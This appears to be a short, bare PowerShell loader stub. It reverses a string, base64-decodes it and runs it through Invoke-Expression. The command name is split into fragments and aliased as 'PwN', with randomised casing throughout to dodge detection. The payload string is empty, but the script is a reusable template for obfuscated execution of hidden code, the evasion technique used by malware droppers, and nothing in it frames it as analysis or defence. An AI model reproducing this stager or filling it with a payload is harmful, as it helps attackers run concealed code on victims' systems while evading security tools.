$zGK4W2iU1 = "" ;
$TvRNVEB = $zGK4W2iU1.ToCharArray() ; [array]::Reverse($TvRNVEB) ; -join $TvRNVEB 2>&1> $null ;
$zag = [sYsTem.texT.EnCODiNg]::UTF8.GETSTrING([SYstEm.CoNverT]::FROmbase64sTRInG("$TvRNVEB")) ;
$UwCTHcUDakg00 = "In"+"vo"+"KE"+"-E"+"xP"+"RE"+"SS"+"Io"+"N" ; New-alIAs -nAme PwN -VALuE $UwCTHcUDakg00 -fORce ; pwN $zag ;

